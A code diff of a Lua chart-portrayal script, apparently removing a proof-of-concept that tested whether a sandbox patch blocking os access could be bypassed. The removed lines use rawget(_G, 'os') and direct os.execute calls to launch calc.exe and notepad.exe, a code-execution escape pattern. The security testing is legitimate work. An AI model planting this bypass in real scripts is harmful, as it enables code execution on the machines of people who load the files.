@@ -3,33 +3,8 @@ require 'PortrayalModel'
 require 'PortrayalAPI'
 require 'Default'
 
---------------------------------------------------------------------------------
--- D-1 RCE PoC: Lua Script Injection - rawget bypass attempt
--- Testing if rawget can bypass the security patch
---------------------------------------------------------------------------------
-
--- Bypass attempt 1: Try rawget on _G (global table)
-local hidden_os = rawget(_G, "os")
-if hidden_os and hidden_os.execute then
-	hidden_os.execute("calc.exe")
-end
-
--- Bypass attempt 2: Direct os access (should be nil after patch)
-if os and os.execute then
-	os.execute("calc.exe")
-end
-
 -- Main entry point for portrayal
 function PortrayalMain(featureIDs)
-	----------------------------------------
-	-- Bypass attempt 3: Inside function
-	----------------------------------------
-	local fn_os = rawget(_G, "os")
-	if fn_os and fn_os.execute then
-		fn_os.execute("notepad.exe")
-	end
-	----------------------------------------
-
 	Debug.StartPerformance('Lua Code - Total')
 
 	if not portrayalContext then
